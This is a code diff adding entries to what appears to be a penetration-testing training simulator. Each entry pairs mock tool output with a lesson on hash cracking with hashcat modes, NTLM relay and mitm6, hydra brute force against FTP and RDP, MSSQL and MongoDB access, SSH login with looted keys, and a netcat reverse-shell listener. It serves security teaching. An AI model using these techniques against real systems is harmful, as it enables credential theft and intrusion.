@@ -1171,5 +1171,141 @@
       teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A `test/test` login left in a comment is a free set of working credentials — read the page humans never read.',
     },
 
+    // ==================== CREDENTIALS & CRACKING (depth) ====================
+    'crack-identify': {
+      output: [
+        '$ nth -f hashes.txt',
+        '$krb5tgs$23$...',
+        'Most likely: Kerberos 5 TGS-REP etype 23  hashcat: 13100',
+      ].join('\n'),
+      signal: 'Most likely: Kerberos 5 TGS-REP etype 23  hashcat: 13100',
+      teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (here 13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm — identify first, always.',
+    },
+    'crack-asrep-offline': {
+      output: [
+        '$krb5asrep$23$jdoe@CORP.LOCAL:a1b2...:... : Welcome2024!',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'Status...........: Cracked',
+      teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" means you now hold that user\'s real password — turn the roast into a login.',
+    },
+    'crack-shadow': {
+      output: [
+        'root:$6$xyz$...:::: : toor123',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'Status...........: Cracked',
+      teach: 'A `$6$` hash from /etc/shadow is sha512crypt (mode 1800) — slow by design, so lean on a good wordlist and rules rather than brute force. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
+    },
+    'crack-archive': {
+      output: [
+        '$ zip2john backup.zip > backup.hash',
+        '$ hashcat -m 17200 backup.hash rockyou.txt',
+        'backup.zip:hunter2 ... : hunter2',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'Status...........: Cracked',
+      teach: 'A password-protected archive you looted is just another crackable hash — `zip2john`/`office2john` extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
+    },
+    'crack-mscache2': {
+      output: [
+        '$DCC2$10240#jdoe#a1b2c3... : Autumn2023!',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'Status...........: Cracked',
+      teach: 'Domain Cached Credentials (mscash2, mode 2100) are what a laptop stores so a domain user can log in offline. They crack slowly and cannot be passed — only cracked — but a recovered password is a real domain credential.',
+    },
+    'ntlm-relay-attack': {
+      output: [
+        '[*] Servers started, waiting for connections',
+        '[*] Authenticating against smb://10.10.10.20 as CORP/JDOE SUCCEED',
+        '[*] Target system bootkey: 0x...',
+        '[*] Dumping local SAM hashes',
+        'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+      ].join('\n'),
+      signal: '[*] Authenticating against smb://10.10.10.20 as CORP/JDOE SUCCEED',
+      teach: 'Relaying forwards a captured authentication to another host instead of cracking it — if SMB signing is off, the victim\'s auth logs you into a second machine as them. "SUCCEED" means you are in without ever knowing the password.',
+    },
+    'mitm6-ipv6-takeover': {
+      output: [
+        '[*] IPv6 address assigned to victim via rogue DHCPv6',
+        '[*] Victim queried WPAD — serving malicious config',
+        '[*] Got credentials relayed to LDAP: CORP\\jdoe',
+      ].join('\n'),
+      signal: '[*] Got credentials relayed to LDAP: CORP\\jdoe',
+      teach: 'Windows prefers IPv6 and asks for a DHCPv6 server even when none is configured. mitm6 answers, becomes the victim\'s DNS, and relays the auth it captures. A default-on protocol you did not know was running becomes the way in.',
+    },
+    'online-brute-ftp': {
+      output: [
+        '[DATA] attacking ftp://10.10.10.10:21/',
+        '[21][ftp] host: 10.10.10.10   login: anonymous   password:',
+        '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
+      ].join('\n'),
+      signal: '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
+      teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords — and always test `anonymous` first, it is free. Keep the wordlist focused; lab and real accounts both lock out under a flood.',
+    },
+    'online-brute-rdp': {
+      output: [
+        '[DATA] attacking rdp://10.10.10.10:3389/',
+        '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
+      ].join('\n'),
+      signal: '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
+      teach: 'A weak RDP password is an interactive desktop. Brute it only when you have a real username and a short list — RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
+    },
+
+    // ==================== DATABASES (depth) ====================
+    'mssql-login': {
+      output: [
+        'SQL> SELECT @@version;',
+        'Microsoft SQL Server 2019 (RTM) ...',
+        'SQL> SELECT IS_SRVROLEMEMBER(\'sysadmin\') AS is_sysadmin;',
+        'is_sysadmin : 1',
+      ].join('\n'),
+      signal: 'is_sysadmin : 1',
+      teach: 'The first thing to check on an MSSQL login is `IS_SRVROLEMEMBER(\'sysadmin\')`. A `1` means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
+    },
+    'mongo-enum': {
+      output: [
+        'PORT      STATE SERVICE',
+        '27017/tcp open  mongodb',
+        '| mongodb-databases:',
+        '|   admin   users   app_secrets',
+        '|_  (no authentication required)',
+      ].join('\n'),
+      signal: '|_  (no authentication required)',
+      teach: 'MongoDB historically shipped with no authentication. If you can list databases without credentials, you can read them — `app_secrets` and `users` collections often hold password hashes or API keys outright.',
+    },
+
+    // ==================== SHELLS & TRANSFER (depth) ====================
+    'ssh-key-login': {
+      output: [
+        '$ chmod 600 id_rsa',
+        '$ ssh -i id_rsa bob@10.10.10.10',
+        'Last login: Mon Jan  1 10:00:00 2024',
+        'bob@target:~$ id',
+        'uid=1000(bob) gid=1000(bob)',
+      ].join('\n'),
+      signal: 'bob@target:~$ id',
+      teach: 'A private key you looted is a password-free login — but SSH refuses a key that others can read, hence `chmod 600`. A stable SSH session beats any reverse shell: it has a real TTY and survives. Always try looted keys against every user and host.',
+    },
+    'shell-listener': {
+      output: [
+        '$ rlwrap nc -lvnp 4444',
+        'listening on [any] 4444 ...',
+      ].join('\n'),
+      signal: 'listening on [any] 4444 ...',
+      teach: 'Before you fire a reverse shell, start the catcher. `nc -lvnp 4444` listens; wrapping it in `rlwrap` gives you command history and arrow keys once the shell lands. Set the listener first — a callback with nothing listening is lost.',
+    },
+    'shell-revshell-windows': {
+      output: [
+        'listening on [any] 4444 ...',
+        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
+        'PS C:\\> whoami',
+        'corp\\svc_web',
+      ].join('\n'),
+      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
+      teach: 'A PowerShell reverse shell calls back to your listener the same way a Linux one does — the "connect to … from" line is the target reaching you. You land as the service account the web app runs under; the next step is Windows enumeration.',
+    },
+
   };
 })(typeof globalThis !== 'undefined' ? globalThis : this);
